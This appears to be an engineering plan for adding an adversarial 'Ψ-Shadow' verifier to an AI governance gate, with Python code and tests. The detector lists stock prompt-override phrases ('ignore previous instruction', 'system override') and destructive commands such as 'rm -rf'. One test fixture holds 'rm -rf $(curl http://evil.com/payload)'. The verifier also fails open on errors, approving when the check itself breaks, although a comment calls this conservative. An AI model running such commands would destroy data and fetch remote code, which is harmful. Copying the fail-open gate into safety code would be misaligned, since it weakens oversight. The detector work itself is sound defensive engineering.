# P0 Implementation Plan: Achieving Full APEX Compliance
## From Documentation to Enforcement

**Priority:** P0 (Critical)  
**Estimated Effort:** 2-3 engineering days  
**Status:** READY FOR IMPLEMENTATION

---

## Overview

This plan addresses the two critical gaps preventing `Implementation ⊨ Specification`:

1. **GAP-1:** Code uses Tri-Witness (W3), not Quad-Witness (W4)
2. **GAP-2:** Ψ-Shadow lacks adversarial logic

---

## Gap-1: Switch from Tri-Witness to Quad-Witness

### Current State
```python
# aaa_mcp/server.py:1092-1110
def build_governance_proof(...):
    human = compute_human_witness(...)
    ai = compute_ai_witness(...)
    earth = compute_earth_witness(...)
    # ❌ Missing: verifier witness
    
    witness_product = human_score * ai_score * earth_score
    w3 = witness_product ** (1 / 3)  # Tri-Witness
    tri_witness_valid = w3 >= 0.95
```

### Target State
```python
def build_governance_proof(...):
    human = compute_human_witness(...)
    ai = compute_ai_witness(...)
    earth = compute_earth_witness(...)
    verifier = compute_verifier_witness(...)  # ✅ NEW
    
    witness_product = human_score * ai_score * earth_score * verifier_score
    w4 = witness_product ** (1 / 4)  # ✅ Quad-Witness
    quad_witness_valid = w4 >= 0.75  # ✅ New threshold
```

### Implementation Steps

#### Step 1.1: Create `compute_verifier_witness()`

**File:** `aaa_mcp/server.py`  
**Location:** After `compute_earth_witness()` (~line 1594)

```python
def compute_verifier_witness(
    *,
    context: dict[str, Any],
    proposal: str,
    agi_result: dict[str, Any] | None = None,
    asi_result: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """
    Ψ-Shadow (Adversarial Verifier) Witness
    
    The 4th witness in Quad-Witness consensus. Returns HIGH score only if
    the proposal passes adversarial scrutiny. Returns LOW score if attacks,
    contradictions, or harm scenarios are detected.
    
    SPEC: W₄ = (H × A × E × V)^(1/4) ≥ 0.75
    This witness provides the 'V' component.
    
    Returns:
        {
            "valid": bool,
            "score": float [0,1],  # 1.0 = no attacks found, 0.0 = critical flaw
            "signals": {
                "attacks_found": bool,
                "contradictions": list,
                "harm_scenarios": list,
                "injection_vectors": list
            }
        }
    """
    signals: dict[str, Any] = {
        "attacks_found": False,
        "contradictions": [],
        "harm_scenarios": [],
        "injection_vectors": [],
        "critique_verdict": "APPROVE"
    }
    
    # Initialize PsiShadow for adversarial analysis
    try:
        from aclip_cai.triad.psi import PsiShadow
        shadow = PsiShadow()
        
        critique = shadow.attack_proposal(
            proposal=proposal,
            agi_context=agi_result,
            asi_context=asi_result
        )
        
        signals["contradictions"] = critique.get("logical_contradictions", [])
        signals["injection_vectors"] = critique.get("injection_vectors", [])
        signals["harm_scenarios"] = critique.get("harm_scenarios", [])
        signals["critique_verdict"] = critique.get("verdict", "APPROVE")
        signals["attacks_found"] = critique.get("verdict") == "REJECT"
        
    except Exception as e:
        # Fail-safe: if shadow fails, assume safe (conservative)
        signals["critique_error"] = str(e)
        signals["critique_verdict"] = "APPROVE"  # Fail open to prevent deadlock
    
    # Compute verifier score
    if signals["attacks_found"]:
        score = 0.1  # Low score blocks consensus
        valid = False
    elif signals["contradictions"] or signals["harm_scenarios"]:
        score = 0.5  # Partial score, may fail threshold
        valid = False
    else:
        score = 0.98  # High score allows consensus
        valid = True
    
    return {
        "valid": valid,
        "score": score,
        "signals": signals
    }
```

#### Step 1.2: Update `build_governance_proof()`

**File:** `aaa_mcp/server.py`  
**Location:** Line 1051

```python
def build_governance_proof(
    *,
    continuity_ok: bool,
    approval_ok: bool,
    human_approve: bool,
    public_approval_mode: bool,
    truth_score: Any,
    truth_threshold: Any,
    precedent_count: int,
    grounding_present: bool,
    revocation_ok: bool,
    health_ok: bool,
    omega_ortho: Any,
    mode_collapse: bool,
    non_violation_status: bool,
    # ✅ NEW PARAMETERS
    proposal: str = "",
    agi_result: dict[str, Any] | None = None,
    asi_result: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """
    Build governance proof with Quad-Witness consensus.
    
    SPEC: W₄ = (H × A × E × V)^(1/4) ≥ 0.75
    """
    # Existing witnesses
    human = compute_human_witness(...)
    ai = compute_ai_witness(...)
    earth = compute_earth_witness(...)
    
    # ✅ NEW: Verifier witness (Ψ-Shadow)
    verifier = compute_verifier_witness(
        context={},
        proposal=proposal,
        agi_result=agi_result,
        asi_result=asi_result
    )
    
    # Thermodynamic validation
    omega_score = _clamp01(omega_ortho, default=1.0)
    omega_valid = True if omega_ortho is None else omega_score >= 0.95
    thermodynamics_valid = non_violation_status and (not mode_collapse) and omega_valid
    thermodynamic_score = (
        (1.0 if non_violation_status else 0.0) * 0.5
        + (1.0 if not mode_collapse else 0.0) * 0.25
        + omega_score * 0.25
    )
    
    # ✅ UPDATED: Authority pillar includes verifier
    authority_valid = bool(human.get("valid")) and bool(verifier.get("valid"))
    authority_score = min(
        _clamp01(human.get("score"), default=0.0),
        _clamp01(verifier.get("score"), default=0.0)
    )
    
    # ✅ UPDATED: Quad-Witness calculation (W4)
    witness_product = (
        _clamp01(human.get("score"), default=0.0)
        * _clamp01(ai.get("score"), default=0.0)
        * _clamp01(earth.get("score"), default=0.0)
        * _clamp01(verifier.get("score"), default=0.0)  # NEW
    )
    
    # Use W4 (Quad-Witness) instead of W3 (Tri-Witness)
    w4 = witness_product ** (1 / 4) if witness_product > 0.0 else 0.0  # ✅ CHANGED
    quad_witness_valid = w4 >= 0.75 and bool(human.get("valid")) and bool(earth.get("valid"))  # ✅ CHANGED
    
    proof: dict[str, Any] = {
        "authority_valid": authority_valid,
        "thermodynamics_valid": thermodynamics_valid,
        # ✅ CHANGED: quad_witness instead of tri_witness
        "quad_witness_valid": quad_witness_valid,
        "authority_score": authority_score,
        "thermodynamic_score": _clamp01(thermodynamic_score, default=0.0),
        "witness": {
            "human": human,
            "ai": ai,
            "earth": earth,
            "verifier": verifier,  # ✅ NEW
            # ✅ CHANGED: w4 instead of w3
            "w4": w4,
            # Keep w3 for backward compatibility during transition
            "w3": (witness_product / max(verifier.get("score", 0.98), 0.01)) ** (1 / 3) if witness_product > 0 else 0
        },
        "gate_verdict": "SEAL",
        "gate_reason": "All fused governance pillars are valid.",
    }
    
    return apply_governance_gate(current_verdict="SEAL", governance_proof=proof)
```

#### Step 1.3: Update `apply_governance_gate()`

**File:** `aaa_mcp/server.py`  
**Location:** Line ~1120

```python
def apply_governance_gate(
    *, current_verdict: str, governance_proof: dict[str, Any]
) -> dict[str, Any]:
    verdict = str(current_verdict or "VOID").upper()
    
    if not governance_proof.get("authority_valid"):
        governance_proof["gate_verdict"] = "VOID"
        governance_proof["gate_reason"] = "Authority pillar failed (F11/F13)."
    elif not governance_proof.get("thermodynamics_valid"):
        governance_proof["gate_verdict"] = "VOID"
        governance_proof["gate_reason"] = "Thermodynamic pillar failed (P3 plausibility)."
    # ✅ CHANGED: Check quad_witness instead of tri_witness
    elif not governance_proof.get("quad_witness_valid"):
        governance_proof["gate_verdict"] = "888_HOLD"
        governance_proof["gate_reason"] = "Quad-Witness consensus below F3 threshold (W4 < 0.75)."
    elif verdict == "VOID":
        governance_proof["gate_verdict"] = "VOID"
        governance_proof["gate_reason"] = "Underlying verdict is already VOID."
    else:
        governance_proof["gate_verdict"] = verdict
        governance_proof["gate_reason"] = "Gate passed; preserving underlying verdict."
    
    return governance_proof
```

#### Step 1.4: Update Call Sites

**File:** `aaa_mcp/server.py`  
**Locations:** `apex_judge()` (~line 1740)

Update the call to `build_governance_proof()` to include new parameters:

```python
governance_proof = build_governance_proof(
    continuity_ok=bool(continuity_binding),
    approval_ok=approval_ok,
    human_approve=human_approve,
    public_approval_mode=_PUBLIC_APPROVAL_MODE,
    truth_score=truth_score,
    truth_threshold=truth_threshold,
    precedent_count=len(precedents),
    grounding_present=bool(precedents) or bool(str(query).strip()),
    revocation_ok=True,
    health_ok=True,
    omega_ortho=omega_ortho,
    mode_collapse=mode_collapse,
    non_violation_status=verdict.upper() != "VOID",
    # ✅ NEW PARAMETERS
    proposal=query,
    agi_result=agi_result,
    asi_result=asi_result,
)
```

---

## Gap-2: Implement True Ψ-Shadow Adversarial Logic

### Current State
```python
# critique_thought is alignment-based, not adversarial
async def _critique_thought(session_id, plan, ...):
    critique_text = json.dumps(plan, ...)
    payload = await align(session_id=session_id, action=critique_text)  # ❌ Not attack
```

### Target State
```python
# PsiShadow attacks proposals to find flaws
class PsiShadow:
    def attack_proposal(self, proposal):
        return {
            "logical_contradictions": [...],  # ✅ NEW
            "injection_vectors": [...],       # ✅ NEW
            "harm_scenarios": [...],          # ✅ NEW
            "verdict": "REJECT" if any_attack else "APPROVE"
        }
```

### Implementation Steps

#### Step 2.1: Create `PsiShadow` Class

**File:** `aclip_cai/triad/psi/shadow.py` (NEW FILE)

```python
"""
Ψ-Shadow: The Adversarial Witness

Implements the 4th witness in Quad-Witness consensus.
Job: Attack proposals to find flaws that other witnesses miss.
Safety through opposition.
"""

from dataclasses import dataclass
from typing import Any
import re


@dataclass
class AttackResult:
    """Result of adversarial analysis."""
    logical_contradictions: list[dict]
    injection_vectors: list[dict]
    harm_scenarios: list[dict]
    entropy_assessment: dict
    verdict: str  # "APPROVE" or "REJECT"
    confidence: float


class PsiShadow:
    """
    Ψ-Shadow: The Adversarial Witness
    
    Unlike alignment/critique tools, the Shadow's job is to DISAGREE.
    It searches for:
    - Logical contradictions within the proposal
    - Prompt injection vulnerabilities
    - Unmodeled harm scenarios
    - Entropy-increasing actions
    
    SPEC: Returns LOW score if attacks found, HIGH if safe
    """
    
    def __init__(self):
        self.contradiction_patterns = [
            # Common logical fallacies in AI proposals
            r"\b(delete|remove).*(backup|recovery)",  # No recovery plan
            r"\b(execute|run).*(without|bypass).*(check|verify)",  # Bypassing checks
            r"\b(irreversible).*(and|but).*(undo|revert)",  # Contradictory reversibility
        ]
        
        self.injection_patterns = [
            # Prompt injection indicators
            r"ignore.*previous.*instruction",
            r"disregard.*(safety|constraint)",
            r"new.*instruction.*:",
            r"system.*override",
        ]
        
        self.harm_indicators = [
            # Actions with unmodeled harm
            "production database",
            "live system",
            "customer data",
            "without backup",
            "permanent delete",
        ]
    
    def attack_proposal(
        self,
        proposal: str,
        agi_context: dict[str, Any] | None = None,
        asi_context: dict[str, Any] | None = None
    ) -> dict[str, Any]:
        """
        Execute adversarial analysis on a proposal.
        
        Returns attack findings that can be used to block unsafe proposals.
        """
        proposal_lower = proposal.lower()
        
        # Attack 1: Find logical contradictions
        contradictions = self.find_contradictions(proposal)
        
        # Attack 2: Simulate prompt injection
        injection_vectors = self.simulate_injection(proposal)
        
        # Attack 3: Model harm scenarios
        harm_scenarios = self.model_casualty_chain(proposal, asi_context)
        
        # Attack 4: Calculate entropy/disorder
        entropy_assessment = self.calculate_disorder(proposal, agi_context)
        
        # Determine verdict
        critical_flaw = (
            len(contradictions) > 0 and any(c.get("severity") == "CRITICAL" for c in contradictions)
            or len([v for v in injection_vectors if v.get("exploitable")]) > 0
            or len([h for h in harm_scenarios if h.get("severity") == "HIGH"]) > 0
        )
        
        moderate_flaw = (
            len(contradictions) > 0
            or len(injection_vectors) > 0
            or len(harm_scenarios) > 0
            or entropy_assessment.get("entropy_increases", False)
        )
        
        if critical_flaw:
            verdict = "REJECT"
            confidence = 0.95
        elif moderate_flaw:
            verdict = "REJECT"
            confidence = 0.75
        else:
            verdict = "APPROVE"
            confidence = 0.90
        
        return {
            "logical_contradictions": contradictions,
            "injection_vectors": injection_vectors,
            "harm_scenarios": harm_scenarios,
            "entropy_assessment": entropy_assessment,
            "verdict": verdict,
            "confidence": confidence
        }
    
    def find_contradictions(self, proposal: str) -> list[dict]:
        """Find internal logical contradictions in the proposal."""
        contradictions = []
        proposal_lower = proposal.lower()
        
        # Check for contradictory reversibility claims
        has_irreversible = any(kw in proposal_lower for kw in ["delete", "drop", "permanent"])
        has_reversible = any(kw in proposal_lower for kw in ["undo", "revert", "restore", "backup"])
        
        if has_irreversible and has_reversible:
            contradictions.append({
                "type": "REVERSIBILITY_CONTRADICTION",
                "description": "Proposal claims both irreversible and reversible effects",
                "severity": "HIGH"
            })
        
        # Check for safety bypass claims
        if re.search(r"(bypass|ignore|skip).*(safety|check|verify)", proposal_lower):
            contradictions.append({
                "type": "SAFETY_BYPASS",
                "description": "Proposal suggests bypassing safety mechanisms",
                "severity": "CRITICAL"
            })
        
        # Check for pattern matches
        for pattern in self.contradiction_patterns:
            if re.search(pattern, proposal_lower):
                contradictions.append({
                    "type": "PATTERN_MATCH",
                    "description": f"Matched contradiction pattern: {pattern[:30]}...",
                    "severity": "MEDIUM"
                })
        
        return contradictions
    
    def simulate_injection(self, proposal: str) -> list[dict]:
        """Simulate prompt injection attacks against the proposal."""
        vectors = []
        proposal_lower = proposal.lower()
        
        for pattern in self.injection_patterns:
            if re.search(pattern, proposal_lower):
                vectors.append({
                    "type": "PROMPT_INJECTION",
                    "description": f"Potential injection vector: {pattern[:40]}...",
                    "exploitable": True,
                    "severity": "HIGH"
                })
        
        # Check for command injection in shell commands
        if "$(" in proposal or "`" in proposal or ";" in proposal:
            if any(cmd in proposal_lower for cmd in ["rm", "drop", "delete", "format"]):
                vectors.append({
                    "type": "COMMAND_INJECTION",
                    "description": "Shell command contains potential injection vectors",
                    "exploitable": True,
                    "severity": "CRITICAL"
                })
        
        return vectors
    
    def model_casualty_chain(self, proposal: str, asi_context: dict | None) -> list[dict]:
        """Model potential harm scenarios using Theory of Mind."""
        scenarios = []
        proposal_lower = proposal.lower()
        
        # Check for production system modifications
        if any(kw in proposal_lower for kw in self.harm_indicators):
            if "backup" not in proposal_lower and "test" not in proposal_lower:
                scenarios.append({
                    "type": "UNMODELED_HARM",
                    "description": "Proposal affects production without visible safety checks",
                    "affected_stakeholders": ["users", "system", "operators"],
                    "severity": "HIGH",
                    "mitigation_required": True
                })
        
        # Check for data loss scenarios
        destructive_patterns = ["delete all", "drop table", "rm -rf", "format"]
        for pattern in destructive_patterns:
            if pattern in proposal_lower:
                scenarios.append({
                    "type": "DATA_LOSS",
                    "description": f"Destructive pattern detected: {pattern}",
                    "affected_stakeholders": ["data_owners", "users"],
                    "severity": "CRITICAL",
                    "mitigation_required": True
                })
        
        return scenarios
    
    def calculate_disorder(self, proposal: str, agi_context: dict | None) -> dict:
        """Calculate if proposal increases system entropy/disorder."""
        proposal_lower = proposal.lower()
        
        # Heuristic: Destructive actions increase entropy
        destructive = any(kw in proposal_lower for kw in [
            "delete", "remove", "drop", "wipe", "clear all"
        ])
        
        # Creative actions without structure increase entropy
        unstructured = (
            "create" in proposal_lower
            and "structure" not in proposal_lower
            and "organize" not in proposal_lower
        )
        
        entropy_increases = destructive or unstructured
        
        return {
            "entropy_increases": entropy_increases,
            "destructive_component": destructive,
            "unstructured_component": unstructured,
            "estimated_delta_s": 0.5 if entropy_increases else -0.1
        }


# Export
__all__ = ["PsiShadow", "AttackResult"]
```

#### Step 2.2: Update `critique_thought` Tool

**File:** `aaa_mcp/server.py`  
**Update:** `_critique_thought()` function to use PsiShadow

```python
@mcp.tool(
    name="critique_thought",
    description="[Lane: Ψ Psi] [Floors: F4, F7, F8, F9] Ψ-Shadow adversarial analysis & attack simulation.",
)
async def _critique_thought(
    session_id: str,
    plan: dict[str, Any],
    actor_id: str = "anonymous",
    auth_token: str | None = None,
    auth_context: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """
    Ψ-Shadow: Adversarial analysis of a proposal.
    
    Unlike alignment checks, this tool ATTACKS the proposal to find flaws.
    Returns LOW score if attacks/contradictions/harm are detected.
    """
    continuity_binding, continuity_error = _enforce_auth_continuity(
        tool_name="critique_thought",
        stage="666_CRITIQUE",
        session_id=session_id,
        actor_id=actor_id,
        auth_token=auth_token,
        auth_context=auth_context,
        critical=False,
    )
    if continuity_error:
        return continuity_error
    
    # ✅ NEW: Use PsiShadow for adversarial analysis
    from aclip_cai.triad.psi import PsiShadow
    shadow = PsiShadow()
    
    proposal_text = json.dumps(plan, ensure_ascii=True, sort_keys=True)
    critique = shadow.attack_proposal(proposal=proposal_text)
    
    # Also run alignment check for comparison
    alignment_payload = await align(session_id=session_id, action=proposal_text)
    
    # Build comprehensive critique result
    payload = {
        "adversarial_analysis": critique,
        "alignment_check": alignment_payload,
        "verdict": critique["verdict"],
        "confidence": critique["confidence"],
        "witness_score": 0.1 if critique["verdict"] == "REJECT" else 0.98,
        "attacks_found": critique["verdict"] == "REJECT",
        "summary": f"Ψ-Shadow: {len(critique['logical_contradictions'])} contradictions, "
                   f"{len(critique['injection_vectors'])} injection vectors, "
                   f"{len(critique['harm_scenarios'])} harm scenarios"
    }
    
    result = envelope_builder.build_envelope(
        stage="666_CRITIQUE",
        session_id=session_id,
        verdict=critique["verdict"],
        payload=payload,
    )
    
    if continuity_binding:
        result["auth_context"] = _rotate_auth_context(session_id, continuity_binding)
    
    return result
```

#### Step 2.3: Update `aclip_cai/triad/psi/__init__.py`

**File:** `aclip_cai/triad/psi/__init__.py`

```python
"""
Ψ (Psi) Layer: APEX/Soul
Adversarial analysis and final verdict synthesis.
"""

from aclip_cai.triad.psi.shadow import PsiShadow, AttackResult

__all__ = ["PsiShadow", "AttackResult"]
```

---

## Testing

### Unit Tests

**File:** `tests/test_quad_witness.py`

```python
import pytest
from aaa_mcp.server import compute_verifier_witness, build_governance_proof

def test_verifier_rejects_unsafe_proposal():
    """Ψ-Shadow should reject destructive proposals."""
    result = compute_verifier_witness(
        context={},
        proposal="delete production database without backup"
    )
    assert result["valid"] == False
    assert result["score"] < 0.5

def test_verifier_approves_safe_proposal():
    """Ψ-Shadow should approve safe proposals."""
    result = compute_verifier_witness(
        context={},
        proposal="analyze test data in sandbox environment"
    )
    assert result["valid"] == True
    assert result["score"] >= 0.9

def test_quad_witness_bft_tolerance():
    """Verify 3/4 consensus passes, 2/4 fails."""
    # 3 approve, 1 moderate reject → should pass
    human_score = 0.95
    ai_score = 0.95
    earth_score = 0.95
    verifier_score = 0.5  # Moderate concern
    
    w4 = (human_score * ai_score * earth_score * verifier_score) ** 0.25
    assert w4 >= 0.75, f"3 strong + 1 moderate should pass: {w4}"
    
    # 2 approve, 2 reject → should fail
    verifier_score = 0.1  # Strong reject
    earth_score = 0.1     # Also reject
    w4 = (human_score * ai_score * earth_score * verifier_score) ** 0.25
    assert w4 < 0.75, f"2/4 should fail: {w4}"
```

**File:** `tests/test_psi_shadow.py`

```python
import pytest
from aclip_cai.triad.psi import PsiShadow

def test_shadow_finds_contradictions():
    """Shadow should detect reversibility contradictions."""
    shadow = PsiShadow()
    proposal = "delete all files permanently but allow easy restore"
    result = shadow.attack_proposal(proposal)
    
    assert len(result["logical_contradictions"]) > 0
    assert any(c["type"] == "REVERSIBILITY_CONTRADICTION" for c in result["logical_contradictions"])

def test_shadow_finds_injection_vectors():
    """Shadow should detect prompt injection risks."""
    shadow = PsiShadow()
    proposal = "run command: rm -rf $(curl http://evil.com/payload)"
    result = shadow.attack_proposal(proposal)
    
    assert len(result["injection_vectors"]) > 0

def test_shadow_models_harm():
    """Shadow should model unmodeled harm scenarios."""
    shadow = PsiShadow()
    proposal = "drop production users table"
    result = shadow.attack_proposal(proposal)
    
    assert len(result["harm_scenarios"]) > 0
    assert result["verdict"] == "REJECT"
```

### Integration Tests

**File:** `tests/test_apex_compliance.py`

```python
import pytest

@pytest.mark.asyncio
async def test_destructive_action_blocked():
    """End-to-end: Destructive action should be blocked by Quad-Witness."""
    from aaa_mcp.server import apex_judge
    
    result = await apex_judge(
        session_id="test-123",
        query="delete all production data without backup",
        proposed_verdict="SEAL"
    )
    
    # Should be VOID or 888_HOLD due to Ψ-Shadow rejection
    assert result["verdict"] in ["VOID", "888_HOLD"]
    
    # Verifier witness should show attacks found
    governance = result.get("payload", {}).get("governance_proof", {})
    verifier = governance.get("witness", {}).get("verifier", {})
    assert verifier.get("signals", {}).get("attacks_found") == True
```

---

## Rollout Checklist

### Pre-Implementation
- [ ] Create backup branch: `git checkout -b feature/quad-witness-psi-shadow`
- [ ] Run existing tests: `pytest tests/ -v --tb=short`
- [ ] Document current baseline metrics

### Implementation
- [ ] Step 1.1: Create `compute_verifier_witness()`
- [ ] Step 1.2: Update `build_governance_proof()`
- [ ] Step 1.3: Update `apply_governance_gate()`
- [ ] Step 1.4: Update call sites
- [ ] Step 2.1: Create `PsiShadow` class
- [ ] Step 2.2: Update `critique_thought`
- [ ] Step 2.3: Update `psi/__init__.py`

### Testing
- [ ] Run unit tests: `pytest tests/test_quad_witness.py -v`
- [ ] Run unit tests: `pytest tests/test_psi_shadow.py -v`
- [ ] Run integration tests: `pytest tests/test_apex_compliance.py -v`
- [ ] Run full suite: `pytest tests/ -v --tb=short`
- [ ] Verify no regressions

### Deployment
- [ ] Update CHANGELOG.md
- [ ] Update API documentation
- [ ] Deploy to staging
- [ ] Monitor for 24 hours
- [ ] Deploy to production

---

## Success Criteria

✅ **Implementation ⊨ Specification** when:

1. `build_governance_proof()` uses W4 (not W3)
2. `compute_verifier_witness()` is called in consensus
3. `PsiShadow.attack_proposal()` finds real attacks
4. Destructive actions are blocked by Quad-Witness
5. All new tests pass
6. No regressions in existing tests

---

**DITEMPA BUKAN DIBERI** — Forged, Not Given 🔥

**Plan Status:** READY FOR IMPLEMENTATION  
**Estimated Completion:** 2-3 days
